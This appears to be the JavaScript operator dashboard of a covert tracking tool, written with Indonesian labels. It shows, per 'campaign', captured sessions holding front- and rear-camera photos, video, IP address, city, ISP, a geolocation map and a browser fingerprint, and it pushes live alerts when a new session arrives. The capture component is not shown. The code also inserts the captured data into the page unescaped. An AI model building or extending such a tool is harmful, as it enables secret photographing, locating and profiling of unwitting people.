# STATIC - JS dashboard
# ============================================================
F["app/static/js/dashboard.js"] = "if (window.STATS.timeline.length) {\n  new Chart(document.getElementById('chartTimeline'), {\n    type: 'line',\n    data: {\n      labels: window.STATS.timeline.map(x => x.date.slice(5)),\n      datasets: [{ label: 'Sesi per hari', data: window.STATS.timeline.map(x => x.count), borderColor: '#4a9eff', backgroundColor: 'rgba(74,158,255,0.2)', fill: true, tension: 0.35 }],\n    },\n    options: { plugins: { legend: { labels: { color: '#ccc' } } }, scales: { x: { ticks: { color: '#888' }, grid: { color: '#222' } }, y: { ticks: { color: '#888' }, grid: { color: '#222' }, beginAtZero: true } } },\n  });\n}\nif (Object.keys(window.STATS.devices).length) {\n  new Chart(document.getElementById('chartDevices'), {\n    type: 'doughnut',\n    data: { labels: Object.keys(window.STATS.devices), datasets: [{ data: Object.values(window.STATS.devices), backgroundColor: ['#4a9eff','#a06bff','#5be36e','#ffb547','#ff6b6b'] }] },\n    options: { plugins: { legend: { labels: { color: '#ccc' } } } },\n  });\n}\n\nfunction addMap(s) {\n  if (!s.lat || !s.lon) return;\n  const el = document.getElementById('map-' + s.ts);\n  if (!el || el.dataset.done) return;\n  el.dataset.done = '1';\n  const map = L.map(el, { zoomControl: false, attributionControl: false }).setView([s.lat, s.lon], 13);\n  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);\n  L.marker([s.lat, s.lon]).addTo(map);\n}\nwindow.SESSIONS.forEach(addMap);\n\ndocument.querySelectorAll('.del').forEach(a => {\n  a.addEventListener('click', async e => {\n    e.preventDefault();\n    const ts = a.dataset.ts;\n    const r = await Swal.fire({ title: 'Hapus sesi?', text: ts, icon: 'warning', showCancelButton: true, confirmButtonText: 'Hapus', confirmButtonColor: '#c33' });\n    if (!r.isConfirmed) return;\n    await fetch('/api/delete/' + ts, { method: 'POST', headers: { 'X-CSRFToken': window.CSRF_TOKEN } });\n    Swal.fire({ icon: 'success', title: 'Terhapus', timer: 1200, showConfirmButton: false });\n    a.closest('.card').remove();\n  });\n});\n\ndocument.querySelectorAll('.show-events').forEach(a => {\n  a.addEventListener('click', async e => {\n    e.preventDefault();\n    const ts = a.dataset.ts;\n    const r = await fetch('/api/session/' + ts + '/events');\n    const ev = await r.json();\n    const html = ev.length ? ev.map(x => '<div style=\"margin:6px 0\"><b>' + x.event_type + '</b> <span style=\"color:#888\">' + x.created_at + '</span><br><code>' + x.data + '</code></div>').join('<hr style=\"border-color:#222\">') : '<p>Belum ada event.</p>';\n    Swal.fire({ title: 'Event Log - ' + ts, html: '<div style=\"text-align:left;max-height:400px;overflow:auto;font-size:12px\">' + html + '</div>', width: 700 });\n  });\n});\n\ndocument.querySelectorAll('.show-fp').forEach(a => {\n  a.addEventListener('click', e => {\n    e.preventDefault();\n    const fp = JSON.parse(a.dataset.fp || '{}');\n    const rows = Object.entries(fp).map(([k, v]) => '<tr><td style=\"color:#888;padding:4px 10px\">' + k + '</td><td style=\"color:#eee\">' + (typeof v === 'object' ? JSON.stringify(v) : v) + '</td></tr>').join('');\n    Swal.fire({ title: 'Fingerprint', html: '<table style=\"text-align:left;font-size:13px;width:100%\">' + rows + '</table>', width: 600 });\n  });\n});\n\nconst searchBox = document.getElementById('searchBox');\nconst campaignFilter = document.getElementById('campaignFilter');\nfetch('/api/campaigns').then(r => r.json()).then(list => {\n  list.forEach(c => {\n    const opt = document.createElement('option');\n    opt.value = c.campaign;\n    opt.textContent = c.campaign + ' (' + c.n + ')';\n    campaignFilter.appendChild(opt);\n  });\n});\nlet searchTimer;\nfunction applyFilter() {\n  const q = searchBox.value.toLowerCase().trim();\n  const camp = campaignFilter.value;\n  document.querySelectorAll('.card').forEach(card => {\n    const txt = card.textContent.toLowerCase();\n    const cc = card.querySelector('.campaign');\n    const cardCamp = cc ? cc.textContent : '';\n    const matchQ = !q || txt.includes(q);\n    const matchC = !camp || cardCamp === camp;\n    card.style.display = (matchQ && matchC) ? '' : 'none';\n  });\n}\nsearchBox.addEventListener('input', () => { clearTimeout(searchTimer); searchTimer = setTimeout(applyFilter, 200); });\ncampaignFilter.addEventListener('change', applyFilter);\n\ntry {\n  const socket = io('/dash', { transports: ['websocket', 'polling'] });\n  const dot = document.getElementById('liveDot');\n  socket.on('connect', () => dot.classList.remove('off'));\n  socket.on('disconnect', () => dot.classList.add('off'));\n  socket.on('new_session', (data) => {\n    console.log('New session:', data);\n    const badge = document.getElementById('totalBadge');\n    const cur = parseInt(badge.textContent) || 0;\n    badge.textContent = (cur + 1) + ' sesi';\n    if (window.Swal) {\n      Swal.fire({ toast: true, position: 'top-end', icon: 'info', title: 'Sesi baru masuk!', text: (data.city || '?') + ', ' + (data.region || '?'), timer: 3000, showConfirmButton: false });\n    }\n    const grid = document.getElementById('cards');\n    const card = document.createElement('div');\n    card.className = 'card new-flash';\n    card.dataset.ts = data.ts;\n    let imgs = '';\n    if (data.has_depan) imgs += '<a href=\"/api/file/' + data.ts + '_depan.png\" target=\"_blank\"><img src=\"/api/file/' + data.ts + '_depan.png\" loading=\"lazy\"></a>';\n    if (data.has_belakang) imgs += '<a href=\"/api/file/' + data.ts + '_belakang.png\" target=\"_blank\"><img src=\"/api/file/' + data.ts + '_belakang.png\" loading=\"lazy\"></a>';\n    if (data.has_video) imgs += '<video src=\"/api/file/' + data.ts + '_video.webm\" controls preload=\"metadata\"></video>';\n    card.innerHTML = '<div class=\"imgs\">' + imgs + '</div><div class=\"info\"><div class=\"row\"><b>Waktu:</b> ' + data.waktu + '</div><div class=\"row\"><b>IP:</b> ' + (data.ip_publik || data.ip_koneksi || '-') + '</div><div class=\"row\"><b>Kota:</b> ' + (data.city || '-') + ', ' + (data.region || '-') + '</div><div class=\"row\"><b>ISP:</b> ' + (data.isp || '-') + '</div><div class=\"row\"><b>Campaign:</b> <span class=\"campaign\">' + (data.campaign || 'default') + '</span></div></div>';\n    if (grid.firstChild) grid.insertBefore(card, grid.firstChild);\n    else grid.appendChild(card);\n    addMap(data);\n  });\n} catch (e) { console.log('Socket.IO gagal:', e); }\n"

